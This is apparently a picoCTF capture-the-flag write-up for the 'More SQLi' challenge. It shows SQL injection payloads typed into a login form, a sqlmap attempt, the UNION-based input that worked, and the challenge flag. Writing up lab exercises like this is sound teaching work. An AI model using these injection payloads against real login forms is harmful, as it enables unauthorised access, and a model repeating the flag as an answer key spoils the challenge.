# More SQLi

* Author: Mubarak Mikail
* Location: https://play.picoctf.org/practice/challenge/358
* Tags: Web Exploitation, sql

## Problem 

> Can you find the flag on this website?

This challenge came with a hint that simply read "SQLiLite."

## Solution

I began by starting the instance associated with this room (Figure 1) and a website was booted up. I visited the website with a browser going through Burp Suite's proxy and its homepage was returned to me (Figure 2).

From the title, tags, and hints associated with the challenge, I assumed that this website is vulnerable to SQL Injection. I tried to attack the form by typing ``' OR 1=1--`` in the username field and "dna deniers" in the password field (Figure 3). The following was returned to me:

```
username: ' OR 1=1--
password: dna deniers
SQL query: SELECT id FROM users WHERE password = 'dna deniers' AND username = '' OR 1=1--'
```

I tried again but with swapping the inputs: ``dna deniers`` was typed into the username form and ``' OR 1=1--`` was typed into the password form. I was greeted with some kind of directory (Figure 4). I tried to search for "picoCTF" from this web form, but nothing was returned (Figure 5). 

I figured that I wasn't really getting anywhere with basic SQL injection attacks, so I decided to use ``sqlmap`` to see if I can get anything useful from the database (I also kept a SQLite injection cheat sheet as a reference [1]). I started by logging out of the site and logging back in with the credentials "rockingmra" as a username and "dna deniers" as a password. The following was returned:

```
username: rockingmra
password: dna deniers
SQL query: SELECT id FROM users WHERE password = 'dna deniers' AND username = 'rockingmra'
```

I then saved the POST request into a file called ``sql`` and then instructed ``sqlmap`` to attack the web application with different values for ``--level`` and ``--risk``. This did not work, so I finally tried the following username and password combination:

```
username: dna deniers
password: ' UNION SELECT sqlite_version()--
```

I finally got the flag in Burp Suite (Figure 8): 

```
HTTP/1.1 302 Found
Host: [redacted]
Date: [redacted] GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.18
Expires: [redacted] GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: welcome.php
Content-type: text/html; charset=UTF-8

<pre>username: dna deniers
password: ' UNION SELECT sqlite_version()--
SQL query: SELECT id FROM users WHERE password = '' UNION SELECT sqlite_version()--' AND username = 'dna deniers'
</pre><h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}</p>
<!DOCTYPE html>
<html lang="en">

[... snip ...]
```

The flag is: ``picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}``

## References

1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
